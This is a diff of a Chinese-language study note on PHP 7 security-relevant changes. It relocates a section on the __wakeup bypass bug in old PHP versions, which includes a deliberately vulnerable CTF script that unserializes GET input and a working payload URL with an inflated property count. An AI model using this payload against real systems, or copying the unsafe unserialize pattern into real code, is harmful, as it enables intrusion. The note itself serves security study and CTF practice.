@@ -39,6 +39,34 @@ $data2 = unserialize($serializedObj2 , ["allowed_classes" => ["MyClass1", "MyCla
 
 提一下，菜刀在实现文件管理器的时候用的恰好也是assert函数，这导致菜刀没办法在PHP7上正常运行。
 
+### dl()函数在PHP-FPM in PHP 7.0.0.中被移除
+
+
+
+### `__wakeup` 的修复
+
+PHP 有个 [Bug](https://bugs.php.net/bug.php?id=72663)，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值`大于`真实的属性个数时会跳过 `__wakeup` 函数的执行。
+
+``` 
+<?php
+class xctf
+{    
+	public $flag = "111";
+    public function __wakeup()    
+    {       
+    	exit('bad requests');    
+    }
+} //echo serialize(new xctf());
+echo unserialize($_GET['code']);echo "flag{****}";?>
+```
+
+使用这个 payload 绕过 `__wakeup` 函数
+
+```
+# O:4:"xctf":1:{s:4:"flag";s:3:"111";}
+http://www.example.com/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
+```
+
 ## 语法修改
 
 ### foreach不再改变
@@ -81,31 +109,8 @@ if (octdec( '012999999999999' )==octdec( '012' )){
 
 ![](http://ww1.sinaimg.cn/large/006pWR9aly1g58m9xr2ldj30j604q0so.jpg)
 
-现在只有`<?php ?>`这样的标签能在php7上运行了。
-
-### `__wakeup` 函数被废弃
-
-PHP 有个 [Bug](https://bugs.php.net/bug.php?id=72663)，触发该漏洞的PHP版本为PHP5小于5.6.25或PHP7小于7.0.10，该漏洞可以简要的概括为：当序列化字符串中表示对象个数的值`大于`真实的属性个数时会跳过 `__wakeup` 函数的执行。
-
-``` 
-<?php
-class xctf
-{    
-	public $flag = "111";
-    public function __wakeup()    
-    {       
-    	exit('bad requests');    
-    }
-} //echo serialize(new xctf());
-echo unserialize($_GET['code']);echo "flag{****}";?>
-```
-
-使用这个 payload 绕过 `__wakeup` 函数
-
-```
-# O:4:"xctf":1:{s:4:"flag";s:3:"111";}
-http://www.example.com/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}
-```
+只能使用`<?php ?>`、`<?= ?>`。
+此外`<? ?>`需要看是否开启短标签。
 
 ### 超大浮点数类型转换截断
 
